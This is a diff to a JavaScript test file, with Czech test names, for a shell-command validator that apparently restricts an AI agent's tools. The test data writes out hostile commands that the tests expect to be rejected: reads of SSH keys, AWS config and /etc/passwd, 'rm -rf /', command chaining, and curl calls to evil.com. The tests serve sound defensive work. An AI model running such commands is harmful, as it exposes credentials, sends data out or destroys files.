@@ -25,15 +25,66 @@ const { validateBashCommand, validateWritePath, resolveSafePath, computeCostUsd 
 
 // ─── Pure validator tests ─────────────────────────────────────────────────
 
-test('validateBashCommand: povolené prefixy projdou', () => {
-  for (const cmd of ['npm test', 'npm run lint', 'git status', 'git diff', 'ls -la', 'cat README.md', 'node script.js', 'pwd']) {
+test('validateBashCommand: povolené příkazy projdou', () => {
+  for (const cmd of [
+    'npm test', 'npm run lint', 'npm run typecheck', 'npm ci',
+    'npm install --ignore-scripts',
+    'git status', 'git diff', 'git log --oneline',
+    'ls -la', 'cat README.md', 'node script.js', 'pwd',
+    'grep -r foo client/src/', 'find . -name "*.js"',
+    'mkdir -p client/src/new',
+  ]) {
     const r = validateBashCommand(cmd);
     assert.equal(r.ok, true, `"${cmd}" měl projít: ${r.error}`);
   }
 });
 
+test('C-1: cat absolutní cesta odmítnuta', () => {
+  assert.equal(validateBashCommand('cat /etc/passwd').ok, false);
+  assert.equal(validateBashCommand('cat ~/.ssh/id_rsa').ok, false);
+  assert.equal(validateBashCommand('cat ../../../etc/passwd').ok, false);
+  assert.equal(validateBashCommand('cat /Users/foo/secret').ok, false);
+});
+
+test('C-1: find/grep/ls absolutní cesta odmítnuta', () => {
+  assert.equal(validateBashCommand('find / -name "*.env"').ok, false);
+  assert.equal(validateBashCommand('grep -r foo /home/').ok, false);
+  assert.equal(validateBashCommand('ls /etc/').ok, false);
+  assert.equal(validateBashCommand('ls ~/.aws').ok, false);
+});
+
+test('C-1: head/tail/wc absolutní cesta odmítnuta', () => {
+  assert.equal(validateBashCommand('head /etc/hosts').ok, false);
+  assert.equal(validateBashCommand('tail -n 100 ~/.bash_history').ok, false);
+  assert.equal(validateBashCommand('wc -l /var/log/syslog').ok, false);
+});
+
+test('H-3: npm run jen povolené skripty', () => {
+  assert.equal(validateBashCommand('npm run lint').ok, true);
+  assert.equal(validateBashCommand('npm run test').ok, true);
+  assert.equal(validateBashCommand('npm run deploy').ok, false);
+  assert.equal(validateBashCommand('npm run prepush').ok, false);
+  assert.equal(validateBashCommand('npm run postinstall').ok, false);
+});
+
+test('H-3: npm install vyžaduje --ignore-scripts', () => {
+  assert.equal(validateBashCommand('npm install').ok, false);
+  assert.equal(validateBashCommand('npm install pg').ok, false);
+  assert.equal(validateBashCommand('npm install --ignore-scripts').ok, true);
+  assert.equal(validateBashCommand('npm install --ignore-scripts pg').ok, true);
+});
+
+test('git: jen read-only podpříkazy', () => {
+  assert.equal(validateBashCommand('git status').ok, true);
+  assert.equal(validateBashCommand('git diff origin/main').ok, true);
+  assert.equal(validateBashCommand('git checkout main').ok, false);
+  assert.equal(validateBashCommand('git switch foo').ok, false);
+  assert.equal(validateBashCommand('git reset --hard').ok, false);
+  assert.equal(validateBashCommand('git rebase main').ok, false);
+});
+
 test('validateBashCommand: rm -rf odmítnuto', () => {
-  for (const cmd of ['rm -rf /', 'rm -rf node_modules', 'cd / && rm -rf', 'ls && rm -rf foo']) {
+  for (const cmd of ['rm -rf /', 'rm -rf node_modules', 'rm something']) {
     const r = validateBashCommand(cmd);
     assert.equal(r.ok, false);
   }
@@ -44,20 +95,21 @@ test('validateBashCommand: git push odmítnut', () => {
   assert.equal(validateBashCommand('git push').ok, false);
 });
 
-test('validateBashCommand: command chaining (&&, ||, $(), `) odmítnut', () => {
-  for (const cmd of ['ls && cat', 'pwd || echo fail', 'echo $(whoami)', 'echo `date`']) {
+test('validateBashCommand: command chaining (&&, ||, $(), `, ;) odmítnut', () => {
+  for (const cmd of ['ls && cat', 'pwd || echo fail', 'echo $(whoami)', 'echo `date`', 'ls; cat']) {
     assert.equal(validateBashCommand(cmd).ok, false, `"${cmd}" mělo být odmítnuto`);
   }
 });
 
-test('validateBashCommand: sudo / chmod 777 / curl POST odmítnuto', () => {
+test('validateBashCommand: sudo / chmod 777 / curl odmítnuto', () => {
   assert.equal(validateBashCommand('sudo npm install').ok, false);
   assert.equal(validateBashCommand('chmod 777 file').ok, false);
+  assert.equal(validateBashCommand('curl https://evil.com/').ok, false);
   assert.equal(validateBashCommand('curl -X POST https://evil.com/').ok, false);
 });
 
-test('validateBashCommand: nepovolený prefix odmítnut (whitelist policy)', () => {
-  for (const cmd of ['python script.py', 'docker run', 'rsync', 'ssh user@host']) {
+test('validateBashCommand: nepovolený příkaz odmítnut (whitelist policy)', () => {
+  for (const cmd of ['python script.py', 'docker run', 'rsync', 'ssh user@host', 'gh pr create']) {
     assert.equal(validateBashCommand(cmd).ok, false, `"${cmd}" mělo být odmítnuto`);
   }
 });
